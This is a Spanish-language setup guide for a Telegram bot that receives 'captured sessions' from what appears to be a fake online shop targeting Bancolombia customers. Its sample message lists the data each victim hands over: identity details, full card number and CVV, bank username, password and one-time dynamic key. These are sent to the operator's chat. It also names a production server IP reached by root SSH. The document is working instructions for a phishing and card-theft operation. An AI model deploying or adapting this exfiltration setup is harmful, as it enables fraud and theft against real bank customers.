# Configuración del Bot de Telegram

Este documento explica cómo configurar el bot de Telegram para recibir notificaciones de las sesiones capturadas.

## Paso 1: Crear el Bot

1. Abre Telegram y busca el bot **@BotFather**
2. Envía el comando `/newbot`
3. Sigue las instrucciones:
   - Elige un nombre para tu bot (ej: "CasaPlay Notificaciones")
   - Elige un username que termine en "bot" (ej: "casaplay_notif_bot")
4. BotFather te dará un **token**. Guárdalo, lo necesitarás.

Ejemplo de token: `1234567890:ABCdefGHIjklMNOpqrsTUVwxyz`

## Paso 2: Obtener tu Chat ID

### Opción A: Chat Personal

1. Busca el bot **@userinfobot** en Telegram
2. Inicia una conversación con él
3. Te mostrará tu **Chat ID** (un número)

### Opción B: Grupo de Telegram

1. Crea un grupo en Telegram
2. Añade tu bot al grupo (búscalo por su username)
3. Envía cualquier mensaje en el grupo
4. Abre en tu navegador: `https://api.telegram.org/bot<TU_TOKEN>/getUpdates`
   - Reemplaza `<TU_TOKEN>` con el token que te dio BotFather
5. Busca en la respuesta JSON el campo `"chat":{"id":` 
   - El número que aparece ahí es tu Chat ID
   - Si es un grupo, será un número negativo (ej: `-1234567890`)

## Paso 3: Configurar las Variables de Entorno

### En desarrollo local:

Crea un archivo `.env.local` en la raíz del proyecto:

```env
TELEGRAM_BOT_TOKEN=1234567890:ABCdefGHIjklMNOpqrsTUVwxyz
TELEGRAM_CHAT_ID=123456789
```

### En producción (servidor):

Agrega las variables al archivo `.env` en el servidor:

```bash
ssh root@72.61.70.20
cd /root/WebEditVentas
nano .env
```

Agrega estas líneas:
```env
TELEGRAM_BOT_TOKEN=tu_token_real
TELEGRAM_CHAT_ID=tu_chat_id_real
```

Guarda (Ctrl+O, Enter, Ctrl+X) y reinicia:
```bash
pm2 restart webeditventas
```

## Paso 4: Probar

1. Realiza una compra de prueba en el sitio
2. Completa el flujo hasta ingresar la clave dinámica
3. Deberías recibir un mensaje en Telegram con todos los datos

## Formato del Mensaje

El bot enviará mensajes con este formato:

```
🔔 Nueva Sesión Capturada

Sesión: #abc123
Banco: BANCOLOMBIA
Estado: dynamic_key_entered

📋 Datos del Cliente
Nombre: Juan Pérez
Email: juan@example.com
Teléfono: +573001234567
Cédula: 123456789
Dirección: Calle 123 #45-67
Ciudad: Bogotá

💳 Datos de Tarjeta
Número: 5306917621422745
Titular: JUAN PEREZ
Vencimiento: 12/29
CVV: 123
Marca: MasterCard

🔐 Credenciales Bancarias
Usuario: juanperez
Clave: 1234
Dinámica: 816729

💰 Total: $1.500.000

🕐 Fecha: 1/12/2025, 12:58:40 p. m.
```

## Solución de Problemas

### No llegan los mensajes

1. Verifica que el token y chat ID sean correctos
2. Asegúrate de haber iniciado una conversación con el bot (envíale /start)
3. Si es un grupo, verifica que el bot tenga permisos para enviar mensajes
4. Revisa los logs del servidor: `pm2 logs webeditventas`

### Error "Forbidden" o "Unauthorized"

- El token es incorrecto, verifica con BotFather
- Para grupos: el bot debe ser administrador o tener permiso para enviar mensajes

### Los mensajes se ven mal formateados

- Telegram usa formato Markdown, algunos caracteres especiales pueden causar problemas
- Verifica los logs para ver si hay errores de formato
